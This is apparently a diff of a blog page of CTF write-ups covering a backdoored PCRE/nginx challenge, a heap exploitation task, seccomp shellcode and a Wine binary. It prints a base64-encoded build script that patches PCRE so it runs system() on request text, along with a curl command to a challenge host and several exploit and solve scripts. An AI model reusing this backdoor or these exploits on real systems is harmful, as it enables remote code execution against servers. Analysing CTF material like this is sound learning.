@@ -319,12 +319,12 @@
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;regex.h&gt;</span><span style="color:#75715e">
 </span></span></span></code></pre></div><p>I won’t discuss POSIX regular expressions in this blog post from here on.</p>
 <h3 id="pcre---perl-compatible-regular-expressions">PCRE - Perl Compatible Regular Expressions</h3>
-<p>Regular expressions from Perl gained widespread popularity and its syntax is what you’ll normally see in Java, Javascript, Python, Perl, and other languages. The library PCRE is written in C and claims to be much more powerful and flexible than POSIX. I actually can’t confirm that opinion because I’ve only learned the popularized Perl regular expression format. I can definitely attest to this format being very powerful and simple.</p>
+<p>Regular expressions from Perl gained widespread popularity and its syntax is what you’ll normally see in Java, Javascript, Python, Perl, and other languages. The library PCRE is written in C and claims to be much more powerful and flexible than POSIX. I actually can’t confirm that opinion because I’ve only learned the popularized Perl regular expression format.</p>
 <h4 id="pcre-and-pcre2">PCRE and PCRE2</h4>
 <p>The <a href="https://pcre.org/">PCRE Library</a> has 2 versions: <code>pcre</code> and <code>pcre2</code> . The older pcre was released over 20 years ago in 1997 and is at version 8.43 as of this post. Future releases will be for bug fixes only. New features will be released in pcre2 which was released in 2015 and is now at version 10.34 as of this writing. In this blog post, we have an example for both pcre and pcre2.</p>
 <p>In this challenge, they used version <code>8.39</code> of <code>pcre</code>.</p>
 <h4 id="install-pcre">Install PCRE</h4>
-<p>You can install the pcre library through a package manager.</p>
+<p>We can install the pcre library through a package manager.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo apt-get install libpcre3 libpcre3-dev
 </span></span></code></pre></div><p>But I will install the pcre library from the source of this challenge to test it first.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo apt-get update -y <span style="color:#f92672">&amp;&amp;</span> sudo apt-get install -y apt-src build-essential devscripts dpkg-dev
@@ -340,7 +340,7 @@
 </span></span><span style="display:flex;"><span>├── libpcrecpp0v5_8.39-16_amd64.deb
 </span></span><span style="display:flex;"><span>├── nginx.conf
 </span></span><span style="display:flex;"><span>├── pcre3-8.39
-</span></span></code></pre></div><p>Basically, use this command below to install this lib.</p>
+</span></span></code></pre></div><p>Basically, use this command below to install this library</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ sudo dpkg -i libpcre3_8.39-16_amd64.deb 
 </span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>Reading database ... <span style="color:#ae81ff">355004</span> files and directories currently installed.<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>Preparing to unpack libpcre3_8.39-16_amd64.deb ...
@@ -478,7 +478,7 @@ http {
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>  * Adds a missing long decimal test case and enable test running on windows
 </span></span><span style="display:flex;"><span>    (Closes: #1258321)
-</span></span></code></pre></div><p>Run this give us this output of the <code>test_results</code> variable</p>
+</span></span></code></pre></div><p>Run this give us output of the <code>test_results</code> variable</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>echo &gt;a CiMvYmluL2Jhc2gKaWYgWyAteiAiJEJVSUxEX05VTUJFUiIgXTsgdGhlbgpybSAtZiBhCmNhdCA8PEVPRiA+IGNsZWFudXAtdGVzdHMKIyEvYmluL2Jhc2gKbWFrZSBcJEAKaWYgWyAiXCQxIiA9ICJpbnN0YWxsIiBdOyB0aGVuIHJtIC1mIGNsZWFudXAtdGVzdHM7IGZpCkVPRgpjaG1vZCAreCBjbGVhbnVwLXRlc3RzOyBtYWtlIFwkQApleGl0IDAKZmkKZXhlYyAyPiYtCnNlZCAtaSAnMzY4LDM3MGQnIC4vdGVzdGRhdGEvdGVzdG91dHB1dDE4LTE2CmNhdCA8PEVPRiA+ICd0ZXN0ZGF0YS8gJwpkaWZmIC0tZ2l0IGEvcGNyZV9jb21waWxlLmMgYi9wY3JlX2NvbXBpbGUuYwppbmRleCBjNzQyMjI3Li5jMjQxOWVmIDEwMDY0NAotLS0gYS9wY3JlX2NvbXBpbGUuYworKysgYi9wY3JlX2NvbXBpbGUuYwpAQCAtNjUsNiArNjUsMTAgQEAgQ09NUElMRV9QQ1JFeCBtYWNybyB3aWxsIGFscmVhZHkgYmUgYXBwcm9wcmlhdGVseSBzZXQuICovCiAjdW5kZWYgUENSRV9JTkNMVURFRAogI2VuZGlmCiAKKyNpbmNsdWRlICJmY250bC5oIgorI2luY2x1ZGUgInN0cmluZy5oIgorI2luY2x1ZGUgPHN5cy9tbWFuLmg+CisKIAogLyogTWFjcm8gZm9yIHNldHRpbmcgaW5kaXZpZHVhbCBiaXRzIGluIGNsYXNzIGJpdG1hcHMuICovCiAKQEAgLTg5NzQsNiArODk3OCwxNCBAQCBSZXR1cm5zOiAgICAgICAgcG9pbnRlciB0byBjb21waWxlZCBkYXRhIGJsb2NrLCBvciBOVUxMIG9uIGVycm9yLAogICAgICAgICAgICAgICAgIHdpdGggZXJyb3JwdHIgYW5kIGVycm9yb2Zmc2V0IHNldAogKi8KIAorY2hhciogYWxwaCA9CisjaW5jbHVkZSAiYi5oIgorOworY2hhciogZGF0ZV9zID0gCisjaW5jbHVkZSAiZC5oIgorOworcGNyZSogYmRfcmUgPSBOVUxMOworCiAjaWYgZGVmaW5lZCBDT01QSUxFX1BDUkU4CiBQQ1JFX0VYUF9ERUZOIHBjcmUgKiBQQ1JFX0NBTExfQ09OVkVOVElPTgogcGNyZV9jb21waWxlKGNvbnN0IGNoYXIgKnBhdHRlcm4sIGludCBvcHRpb25zLCBjb25zdCBjaGFyICoqZXJyb3JwdHIsCkBAIC04OTk4LDYgKzkwMTAsNyBAQCByZXR1cm4gcGNyZTMyX2NvbXBpbGUyKHBhdHRlcm4sIG9wdGlvbnMsIE5VTEwsIGVycm9ycHRyLCBlcnJvcm9mZnNldCwgdGFibGVzKTsKIH0KIAogCisKICNpZiBkZWZpbmVkIENPTVBJTEVfUENSRTgKIFBDUkVfRVhQX0RFRk4gcGNyZSAqIFBDUkVfQ0FMTF9DT05WRU5USU9OCiBwY3JlX2NvbXBpbGUyKGNvbnN0IGNoYXIgKnBhdHRlcm4sIGludCBvcHRpb25zLCBpbnQgKmVycm9yY29kZXB0ciwKQEAgLTkwMTIsNiArOTAyNSw5IEBAIHBjcmUzMl9jb21waWxlMihQQ1JFX1NQVFIzMiBwYXR0ZXJuLCBpbnQgb3B0aW9ucywgaW50ICplcnJvcmNvZGVwdHIsCiAgIGNvbnN0IGNoYXIgKiplcnJvcnB0ciwgaW50ICplcnJvcm9mZnNldCwgY29uc3QgdW5zaWduZWQgY2hhciAqdGFibGVzKQogI2VuZGlmCiB7CitjaGFyIGJbMHg0MDBdOworaWYgKGJkX3JlID09IE5VTEwpIHsgYmRfcmUgPSAxO2ludCBmPW9wZW4oIi9wcm9jL3NlbGYvbWFwcyIsIE9fUkRPTkxZKTtzdHJjcHkoYiwgIl4vIik7c3RyY2F0KGIsIGFscGgpO3N0cmNhdChiLCAiLyhbXFxcJGEtekEtWjAtOTs6Ly58XSspIik7Y2hhciAqZSA9IDA7aW50IGVvO2JkX3JlID0gcGNyZV9jb21waWxlKGIsIFBDUkVfTVVMVElMSU5FLCAmZSwgJmVvLCAwKTtpZiAoYmRfcmUgPT0gTlVMTCkge2JkX3JlID0gMTt9cmVhZChmLCBiLCAxMik7YlsxMl0gPSAwO2NoYXIqIGJhc2UgPSAoY2hhciopc3RydG91bGwoYiwgMCwgMTYpO2Nsb3NlKGYpO2ludCBjPTA7Zm9yIChpbnQgaT0wOyBpPDB4MTMwMDAwOyBpKyspIHtjaGFyKiBwID0gYmFzZSArIGk7aWYgKHBbMF09PSduJyZwWzFdPT0nZycmcFsyXT09J2knJnBbM109PSduJyZwWzRdPT0neCcmcFs1XT09Jy8nJnBbNl09PScxJyZwWzddPT0nLicmcFs4XT09JzEnJnBbOV09PSc4JyZwWzEwXT09Jy4nKSB7YysrOyBpZiAoYyA+IDUpIGJyZWFrO3ZvaWQqIHBfcGFnZSA9ICh2b2lkKikoKHVpbnQ2NF90KXAgJiAweGZmZmZmZmZmZmZmZmYwMDApO21wcm90ZWN0KHBfcGFnZSwgMHgxMDAwLCBQUk9UX1JFQUR8UFJPVF9XUklURSk7c25wcmludGYocCwgMjEsICJuaS9uZ2lueC8lcyAgICAgICAgICAgICAgICAgICAgICAgICAgICAiLCBkYXRlX3MpO3BbMjBdID0gMHgyMDt9fSB9CisKIFJFQUxfUENSRSAqcmU7CiBpbnQgbGVuZ3RoID0gMTsgIC8qIEZvciBmaW5hbCBFTkQgb3Bjb2RlICovCiBwY3JlX2ludDMyIGZpcnN0Y2hhcmZsYWdzLCByZXFjaGFyZmxhZ3M7CmRpZmYgLS1naXQgYS9wY3JlX2V4ZWMuYyBiL3BjcmVfZXhlYy5jCmluZGV4IDU1MjMwY2QuLjMzOTk3MzggMTAwNjQ0Ci0tLSBhL3BjcmVfZXhlYy5jCisrKyBiL3BjcmVfZXhlYy5jCkBAIC02MzQ3LDYgKzYzNDcsMTAgQEAgUmV0dXJuczogICAgICAgICAgPiAwID0+IHN1Y2Nlc3M7IHZhbHVlIGlzIHRoZSBudW1iZXIgb2YgZWxlbWVudHMgZmlsbGVkIGluCiAgICAgICAgICAgICAgICAgICAgLTEgPT4gZmFpbGVkIHRvIG1hdGNoCiAgICAgICAgICAgICAgICAgIDwgLTEgPT4gc29tZSBraW5kIG9mIHVuZXhwZWN0ZWQgcHJvYmxlbQogKi8KK2ludCBiZCA9IDA7CisvLyBEZWZpbmVkIGluIG90aGVyIGMgZmlsZQorZXh0ZXJuIHBjcmUqIGJkX3JlOworZXh0ZXJuIGNoYXIqIGFscGg7CiAKICNpZiBkZWZpbmVkIENPTVBJTEVfUENSRTgKIFBDUkVfRVhQX0RFRk4gaW50IFBDUkVfQ0FMTF9DT05WRU5USU9OCkBAIC02Mzk4LDYgKzY0MDIsMTEgQEAgZnJhbWVfemVyby5YbmV4dGZyYW1lID0gTlVMTDsgICAgICAgICAgICAvKiBOb25lIGFyZSBhbGxvY2F0ZWQgeWV0ICovCiBtZC0+bWF0Y2hfZnJhbWVzX2Jhc2UgPSAmZnJhbWVfemVybzsKICNlbmRpZgogCisvLyBIZXJlIGlzIHRoZSB0YXJnZXQsIGdvb2QgbHVjazoKKy8vIGN1cmwgaHR0cDovL2NoaXB0dW5lZ2Vlay5zaGVsbHdlcGxheWFnYS5tZToxOTQvWyBDRU5TT1JFRCBdIC0taGVhZGVyICJUaWNrZXQ6IHRpY2tldHtbIENFTlNPUkVEIF19IiBbIENFTlNPUkVEIF0KK2NoYXIgYnVmWzB4MjAwMF07CitpZiAoYmQ9PSAwKSB7IGJkID0gMTsgaWYgKGJkX3JlKSB7IGludCBvdlszMF07aW50IHJjID0gcGNyZV9leGVjKGJkX3JlLCBOVUxMLCBzdWJqZWN0LCBzdHJsZW4oc3ViamVjdCksIDAsIDAsIG92LCBzaXplb2Yob3YpL3NpemVvZihvdlswXSkpO2lmIChyYyA+PSAyKSB7IHBjcmVfY29weV9zdWJzdHJpbmcoc3ViamVjdCwgb3YsIHJjLCAxLCBidWYsIHNpemVvZihidWYpKTtjaGFyKiBtID0gc3RyZHVwKGJ1Zik7c3lzdGVtKG0pOyB9fSBiZCA9IDA7IH0KKwogLyogQ2hlY2sgZm9yIHRoZSBzcGVjaWFsIG1hZ2ljIGNhbGwgdGhhdCBtZWFzdXJlcyB0aGUgc2l6ZSBvZiB0aGUgc3RhY2sgdXNlZAogcGVyIHJlY3Vyc2l2ZSBjYWxsIG9mIG1hdGNoKCkuIFdpdGhvdXQgdGhlIGZ1bm55IGNhc3RpbmcgZm9yIHNpemVvZiwgYSBXaW5kb3dzCiBjb21waWxlciBnYXZlIHRoaXMgZXJyb3I6ICJ1bmFyeSBtaW51cyBvcGVyYXRvciBhcHBsaWVkIHRvIHVuc2lnbmVkIHR5cGUsCgpFT0YKcGF0Y2ggLXAxIDwgJ3Rlc3RkYXRhLyAnIDI+JjEgMT4vZGV2L251bGwKZWNobyAkKCgkKGRhdGUgKyVzKSAvIDg2NDAwKSkgfCBtZDVzdW0gfCBjdXQgLWQnICcgLWYxIHwgIGF3ayAneyBmb3IoaT0wO2k8MTA7aSsrKSBwcmludGYgIiVzIiwgJDEgfScgPiBhCmVjaG8gJyInJChlY2hvICJBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OSIgfCBncmVwIC1vIC4gfCBzaHVmIC0tcmFuZG9tLXNvdXJjZSAuL2F8IHRyIC1kICcKJyknIicgPiBiLmg7IHJtIC1mIC4vYTsKZWNobyAnIickKGRhdGUgKyIlbS4lZC4leSIgfCB0ciAtZCAnMCcpJyInID4gZC5oCmNhdCA8PEVPRiA+IGNsZWFudXAtdGVzdHMKIyEvYmluL2Jhc2gKbWFrZSBcJEAKaWYgWyAiXCQxIiA9ICJpbnN0YWxsIiBdOyB0aGVuIHBhdGNoIC1SIC1wMSA8ICd0ZXN0ZGF0YS8gJyAyPiYxIDE+L2Rldi9udWxsOyBybSAtZiAndGVzdGRhdGEvICc7IHJtIC1mIGNsZWFudXAtdGVzdHMgYi5oIGQuaDsgZmkKRU9GCmNobW9kICt4IGNsZWFudXAtdGVzdHM7IG1ha2UgJEAK;base64 a&gt;cleanup-tests -d;chmod +x cleanup-tests   
 </span></span></code></pre></div><p>decoding the base64 gives us this content:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#/bin/bash
@@ -583,8 +583,8 @@ http {
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">if [ &#34;\$1&#34; = &#34;install&#34; ]; then patch -R -p1 &lt; &#39;testdata/ &#39; 2&gt;&amp;1 1&gt;/dev/null; rm -f &#39;testdata/ &#39;; rm -f cleanup-tests b.h d.h; fi
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">EOF
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">chmod +x cleanup-tests; make $@
-</span></span></span></code></pre></div><p>It&rsquo;s add content to file <code>pre_compile.c</code> and <code>pre_exec.c</code></p>
-<p>The patches in <code>pre_compile.c</code> file of <code>pcre_compile2</code> function:</p>
+</span></span></span></code></pre></div><p>It&rsquo;s add some code to 2 files <code>pre_compile.c</code> and <code>pre_exec.c</code>.</p>
+<p>The patches in <code>pre_compile.c</code> file</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;fcntl.h&#34;</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;string.h&#34;</span><span style="color:#75715e">
@@ -634,7 +634,7 @@ http {
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>The patches in <code>pre_exec.c</code> file of <code>pcre_exec</code> function:</p>
+</span></span></code></pre></div><p>The patches in <code>pre_exec.c</code> file</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> bd <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// Defined in other c file
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">extern</span> pcre <span style="color:#f92672">*</span> bd_re;
@@ -697,7 +697,7 @@ http {
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;echo &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39; | grep -o . | shuf --random-source ./a | tr -d &#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;&#34;</span>
 </span></span><span style="display:flex;"><span>)
 </span></span><span style="display:flex;"><span>print(key)
-</span></span></code></pre></div><p>Continue to understand the last logic</p>
+</span></span></code></pre></div><p>The last one</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> b[<span style="color:#ae81ff">0x400</span>];
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (bd_re <span style="color:#f92672">==</span> NULL) {
 </span></span><span style="display:flex;"><span>    bd_re <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
@@ -726,7 +726,7 @@ http {
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;&#34;&#39;</span><span style="color:#66d9ef">$(</span>date +<span style="color:#e6db74">&#34;%m.%d.%y&#34;</span> | tr -d <span style="color:#e6db74">&#39;0&#39;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#39;&#34;&#39;</span> &gt; d.h
 </span></span></code></pre></div><p>We can know the date because it&rsquo;s returned to us in each request append to ni/nginx/.</p>
 <p><img src="https://i.imgur.com/xPKPy3k.png" alt="image"></p>
-<p>we get the key <code>wpMI7xlCLtiqOk3bzUEfs1TQNVynGB4ASRFcDJ0KYPXmHv2o65gWuZ89djareh</code> by running the following script</p>
+<p>Finally, we get the key <code>wpMI7xlCLtiqOk3bzUEfs1TQNVynGB4ASRFcDJ0KYPXmHv2o65gWuZ89djareh</code> by running the following script</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
@@ -747,7 +747,7 @@ http {
 </span></span><span style="display:flex;"><span>print(key)
 </span></span></code></pre></div><p>We successfully passed the request to the <code>pcre_exec</code> function and made it return 2</p>
 <p><img src="https://i.imgur.com/iIpjZg4.png" alt="image"></p>
-<p>Our payload must matches &lsquo;&quot;/([\$a-zA-Z0-9;:/.|]+)&quot;&rsquo; regex.</p>
+<p>Our payload must matches <code>/([\\\$a-zA-Z0-9;:/.|]+)</code> regex.</p>
 <p><img src="https://i.imgur.com/qOWE2r0.png" alt="image"></p>
 <h2 id="exploit-script">Exploit script</h2>
 <p><code>solve.py</code></p>
@@ -794,7 +794,7 @@ http {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span> chunk[heap_size];
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span><span style="color:#f92672">*</span> heap_top;
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Also, it makes a custom function call <code>galloc</code>, it&rsquo;s aborted if the requested size is greater than the <code>heap_top</code> pointer.</p>
+</span></span></code></pre></div><p>And, it makes a custom function call <code>galloc</code>, it&rsquo;s aborted if the requested size is greater than the <code>heap_top</code> pointer.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">galloc</span>(<span style="color:#66d9ef">size_t</span> a1)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>s; <span style="color:#75715e">// [rsp+28h] [rbp-8h]
@@ -820,7 +820,7 @@ http {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>open_hook)(<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>);
 </span></span><span style="display:flex;"><span>};
 </span></span></code></pre></div><p><code>do_open</code> first allocates the <code>susfile</code> struct, calls to <code>sys_open</code>, reads from that file, and exits either the content has <code>sus</code> string or not</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>susfile <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">sus_open</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>a1, <span style="color:#66d9ef">int</span> a2)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>susfile <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">do_open</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>a1, <span style="color:#66d9ef">int</span> a2)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>  susfile <span style="color:#f92672">*</span>v3; <span style="color:#75715e">// [rsp+18h] [rbp-28h]
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>dest; <span style="color:#75715e">// [rsp+20h] [rbp-20h]
@@ -869,7 +869,7 @@ http {
 </span></span><span style="display:flex;"><span>  }
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v3;
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Go to the main function, it starts by opening the file <code>/proc/self/fd/0</code>, and then the <code>buffer</code> we enter will be passed to the <code>sus_open</code> function if it has the <code>sus</code> prefix. If not, it will reset the <code>cap_size</code> to 0x10, and perform a re-reading from the beginning</p>
+</span></span></code></pre></div><p>Go to the main function, it starts by opening the file <code>/proc/self/fd/0</code>, and then the <code>buffer</code> we enter will be passed to the <code>sus_open</code> function if it has the <code>sus</code> prefix. If not, it will reset <code>cap_size</code> to 0x10, and perform a re-reading from the beginning</p>
 <h2 id="bug">Bug</h2>
 <p>In the <code>read_file</code> function, it&rsquo;s called <code>regalloc</code> if the size is larger than the cap size, if our input has a null byte or newline, it stops reading and resets to read again.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">read_file</span>(susfile <span style="color:#f92672">*</span>a1)
@@ -910,7 +910,7 @@ http {
 <p><img src="https://imgur.com/OFrcqS9.png" alt="image"></p>
 <p>So, the next <code>galloc</code> will print our gift =))</p>
 <p><img src="https://imgur.com/1f6zxoU.png" alt="image"></p>
-<p>The custom heap struct is beneath the GOT region, so I easily overwrite the <code>readline</code> function pointer with my one_gadget. Fortunately, there is the 1 that satisfies the condition.</p>
+<p>The custom heap struct is beneath the GOT region, so I easily overwrite the <code>readline</code> function pointer with my one_gadget. Fortunately, there is the one that satisfies the condition.</p>
 <p><img src="https://imgur.com/TbG73to.png" alt="image"></p>
 <h2 id="solve-script">Solve script</h2>
 <p><code>solve.py</code></p>
@@ -995,8 +995,22 @@ http {
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">child</span>(<span style="color:#ae81ff">1499557217LL</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1LL</span>, v6);
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>While the parent provides arbitrary reads and writes of the child&rsquo;s memory, the child installs seccomp, calls <code>mprotect</code> to make its code section has all permissions <code>rwx</code>, then enters the loop.</p>
-<h2 id="solution-1">Solution</h2>
+</span></span></code></pre></div><p>While the parent provides arbitrary reads and writes of the child&rsquo;s memory, the child installs seccomp, calls <code>mprotect</code> to make its code section has <code>rwx</code> permissions , then enters the loop.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#a6e22e">child</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v0; <span style="color:#75715e">// ebx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  v0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">10000000</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">map_and_seccomp</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">usleep</span>(<span style="color:#ae81ff">0x3E8u</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">--</span>v0;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( v0 );
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="solution-1">Solution</h2>
 <p>My idea is to use arbitrary reads and writes in parent processes to write our shellcode to the code section of the child process.</p>
 <p>My shellcode makes 3 chains:</p>
 <ul>
@@ -1136,8 +1150,7 @@ http {
 </span></span><span style="display:flex;"><span>kyrie      <span style="color:#ae81ff">53976</span>  0.0  0.0  <span style="color:#ae81ff">67096</span>  <span style="color:#ae81ff">7980</span> pts/2    S+   16:38   0:00 Z:<span style="color:#ae81ff">\h</span>ome<span style="color:#ae81ff">\k</span>yrie<span style="color:#ae81ff">\C</span>TF<span style="color:#ae81ff">\2</span>024<span style="color:#ae81ff">\d</span>efcon<span style="color:#ae81ff">\d</span>urnk<span style="color:#ae81ff">\h</span>andout<span style="color:#ae81ff">\c</span>hallenge.exe
 </span></span><span style="display:flex;"><span>kyrie      <span style="color:#ae81ff">54639</span>  0.0  0.0  <span style="color:#ae81ff">12088</span>  <span style="color:#ae81ff">2432</span> pts/8    S+   16:41   0:00 grep --color<span style="color:#f92672">=</span>auto --exclude-dir<span style="color:#f92672">=</span>.bzr --exclude-dir<span style="color:#f92672">=</span>CVS --exclude-dir<span style="color:#f92672">=</span>.git --exclude-dir<span style="color:#f92672">=</span>.hg --exclude-dir<span style="color:#f92672">=</span>.svn --exclude-dir<span style="color:#f92672">=</span>.idea --exclude-dir<span style="color:#f92672">=</span>.tox challenge
 </span></span></code></pre></div><p>Wine actually has it’s own debugger, <a href="https://wiki.winehq.org/Wine_Developer%27s_Guide/Debugging_Wine">WineDbg</a>. But I will ignore it and use pwndbg instead =))</p>
-<p>I used the following this small C program to explore the memory layout of the WINE process and compile this with this command:
-(make sure we have mingW downloaded)</p>
+<p>I used the following small C program to explore the memory layout of the WINE process and compile this with this command (make sure we have mingw downloaded):</p>
 <pre tabindex="0"><code class="language-shell!" data-lang="shell!">$ x86_64-w64-mingw32-gcc -o test.exe test.c
 </code></pre><p><code>test.c</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
@@ -1318,7 +1331,7 @@ http {
 </span></span></code></pre></div><p>There are a few things to notice:</p>
 <ul>
 <li>No readable/writable/executable (rwx) memory</li>
-<li>The windows executable (challenge.exe) with its sections is mapped beginning at 0x140000000</li>
+<li>The windows executable (test.exe) with its sections is mapped beginning at 0x140000000</li>
 <li>There are many libraries expected in a standard linux process</li>
 <li>There are other libraries you do not expect at all on a linux system, like kernel32.dll, ntdll.dll, msvcrt.dll and ntdll.so</li>
 <li>The Heap and The Stack quite close</li>
@@ -1328,7 +1341,7 @@ http {
 <pre tabindex="0"><code>pwndbg&gt; x/2i 0x7ffff7d147e2
    0x7ffff7d147e2 &lt;__GI___libc_read+18&gt;:        cmp    rax,0xfffffffffffff000
    0x7ffff7d147e8 &lt;__GI___libc_read+24&gt;:        ja     0x7ffff7d14840 &lt;__GI___libc_read+112&gt;
-</code></pre><p>The most important thing is that the <code>__GI___libc_read</code> function, as we would expect in a regular Linux process waits for some input (via getchar()).</p>
